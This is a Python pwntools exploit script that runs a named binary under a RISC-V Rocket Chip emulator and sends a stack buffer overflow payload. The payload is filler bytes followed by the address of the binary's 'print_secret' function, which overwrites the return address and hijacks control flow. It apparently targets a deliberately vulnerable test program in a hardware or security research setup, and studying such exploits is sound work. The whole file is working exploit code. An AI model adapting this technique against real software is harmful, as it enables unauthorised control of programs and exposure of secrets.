#!/usr/bin/env python

from pwn import *
import sys

if(len(sys.argv) < 2):
    print('usage: python3 bof-ex.py <bin name>')
if(len(sys.argv) >= 4):
    spike = sys.argv[2]
    pk = sys.argv[3]
else:
    spike = 'emulator-freechips.rocketchip.system-freechips.rocketchip.system.DefaultConfig'
    pk = 'build/riscv-pk/pk'

if(len(sys.argv) == 6):
    calls_a = sys.argv[4]
    calls_b = sys.argv[5]
else:
    calls_a = 0
    calls_b = 0

bin_name = sys.argv[1]
cmd = ' '.join([spike, "-V", pk, bin_name, str(calls_a), str(calls_b)])
p = process(argv=cmd.split())
e = ELF(bin_name)
get_a_shell = e.symbols['print_secret']


buf = bytes("1"*120 + "ABCDEFGH" + "BBBBCCCC", 'utf-8') + p64(get_a_shell)
#print(buf)
out = p.recv().decode('utf-8')
print(out)
p.sendline(buf)
out = ''
while True:
    try:
      out += p.recv().decode('utf-8')
    except EOFError:
      print(out)
      break
